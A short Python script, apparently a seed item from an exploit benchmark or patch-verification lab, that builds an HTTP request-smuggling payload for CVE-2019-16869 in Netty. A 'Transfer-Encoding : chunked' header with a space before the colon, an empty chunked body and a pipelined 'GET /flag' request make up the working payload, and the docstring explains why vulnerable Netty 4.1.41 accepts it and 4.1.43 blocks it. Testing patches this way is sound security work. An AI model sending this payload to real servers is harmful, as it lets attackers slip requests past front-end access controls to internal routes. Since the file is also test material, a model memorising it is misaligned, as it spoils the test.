#!/usr/bin/env python3
"""[GIVEN] CVE-2019-16869 seed exploit for Netty's HttpObjectDecoder.

A front `POST /` whose Transfer-Encoding header has a SPACE before the colon
("Transfer-Encoding : chunked"). Pre-fix Netty (splitHeader breaks the header-name
loop at the whitespace) reads it as a valid `Transfer-Encoding: chunked`, so the
front request is framed as chunked. We give it an empty chunked body ("0\\r\\n\\r\\n")
that terminates the request, after which the pipelined `GET /flag` is decoded as the
next request on the keep-alive connection -> reaches the internal ${PCB_FLAG} route.

  V0 netty 4.1.41: splitHeader breaks at the SP -> name "Transfer-Encoding", chunked
        honored -> accepted -> smuggled GET /flag -> FLAG (seed reaches).
  V1 netty 4.1.43: splitHeader (CVE-2019-16869 fix) keeps the SP in the name ->
        DefaultHttpHeaders rejects the illegal name -> BAD_MESSAGE / 400 -> the
        smuggled bytes are swallowed as bad-message content -> BLOCKED (seed closed).

`build_smuggle(front_headers)` is the shared framing helper; the residual reuses it
with a clean Content-Length + Transfer-Encoding:chunked front request.
"""


def build_smuggle(front_headers: bytes) -> bytes:
    """Front `POST /` carrying `front_headers` and an empty chunked body, then a
    pipelined `GET /flag` smuggled request (Connection: close so the reader
    terminates once the canary response is sent)."""
    return (
        b"POST / HTTP/1.1\r\n"
        b"Host: t\r\n"
        + front_headers +
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"GET /flag HTTP/1.1\r\n"
        b"Host: t\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )


def candidate() -> dict:
    # CVE-2019-16869: whitespace before the colon in the Transfer-Encoding header.
    return {
        "id": "cve-2019-16869-te-space-before-colon",
        "raw": build_smuggle(b"Transfer-Encoding : chunked\r\n").decode("latin-1"),
    }


import json

if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
